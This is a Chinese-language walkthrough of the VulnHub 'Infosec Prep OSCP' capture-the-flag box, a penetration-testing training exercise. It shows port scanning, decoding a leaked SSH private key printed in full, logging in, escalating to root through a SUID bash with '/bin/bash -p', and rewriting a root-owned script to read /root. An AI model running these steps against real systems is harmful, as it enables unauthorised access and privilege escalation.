# Infosec Prep OSCP Box

> https://download.vulnhub.com/infosecprep/oscp.zip

靶场IP：

![image-20220720104840709](../../.gitbook/assets/image-20220720104840709.png)

扫描对外端口

```
┌──(root💀kali)-[/tmp]
└─# nmap -p 1-65535 192.168.32.177                                                                                                                                                                                                     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 22:48 EDT
Nmap scan report for 192.168.32.177
Host is up (0.00071s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx
MAC Address: 00:0C:29:B6:A2:40 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds

```

浏览器访问80端口

![image-20220720104945504](../../.gitbook/assets/image-20220720104945504.png)

扫描目录，找到`robots.txt`

![image-20220720105139282](../../.gitbook/assets/image-20220720105139282.png)

![image-20220720105203058](../../.gitbook/assets/image-20220720105203058.png)

找到一串base64加密字符串

![image-20220720105232306](../../.gitbook/assets/image-20220720105232306.png)

解密是私钥文件

```
┌──(root💀kali)-[/tmp]
└─# curl http://192.168.32.177/secret.txt | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3502  100  3502    0     0  2554k      0 --:--:-- --:--:-- --:--:-- 3419k
-----BEGIN OPENSSH PRIVATE KEY-----
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
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----
                                     
```

ssh登录

```
┌──(root💀kali)-[/tmp]
└─# chmod 0600 id_ras                                                                                                                                                                                                                  255 ⨯
                                                                                                                                                                                                                                             
┌──(root💀kali)-[/tmp]
└─# ssh oscp@192.168.32.177 -i id_ras
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 20 Jul 2022 02:55:23 AM UTC

  System load:  0.01               Processes:             217
  Usage of /:   26.9% of 19.56GB   Users logged in:       0
  Memory usage: 38%                IPv4 address for eth0: 192.168.32.177
  Swap usage:   0%


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jul 11 16:50:11 2020 from 192.168.128.1
-bash-5.0$ 

```



直接提权

```
-bash-5.0$ /bin/bash -p
bash-5.0# id
uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
bash-5.0# whoami
root

```

在当前目录发现一个有root脚本

```
-bash-5.0$ cd ~
-bash-5.0$ ls
ip
-bash-5.0$ ls -al
total 36
drwxr-xr-x 4 oscp oscp 4096 Jul 11  2020 .
drwxr-xr-x 3 root root 4096 Jul  9  2020 ..
-rw------- 1 oscp oscp   50 Jul 20 02:57 .bash_history
-rw-r--r-- 1 oscp oscp  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 oscp oscp 3771 Feb 25  2020 .bashrc
drwx------ 2 oscp oscp 4096 Jul  9  2020 .cache
-rwxr-xr-x 1 root root   88 Jul  9  2020 ip
-rw-r--r-- 1 oscp oscp  807 Feb 25  2020 .profile
drwxrwxr-x 2 oscp oscp 4096 Jul  9  2020 .ssh
-rw-r--r-- 1 oscp oscp    0 Jul  9  2020 .sudo_as_admin_successful
-bash-5.0$ cat ip 
#!/bin/sh
cp /etc/issue-standard /etc/issue
/usr/local/bin/get-ip-address >> /etc/issue
-bash-5.0$ cat /usr/local/bin/get-ip-address
#!/bin/sh

/sbin/ifconfig | grep inet | grep -v "127.0.0.1" | grep -v inet6 | awk '{ print "ip: "$2 }'

```

修改IP脚本内容，再重新启动一次，该标志将位于 oscp 主目录中并归 oscp 所有。

```
-bash-5.0$ cat ip
#!/bin/sh 
ls -la /root/ > /home/oscp/ls.txt
```

![image-20230208150055865](../../.gitbook/assets/image-20230208150055865.png)
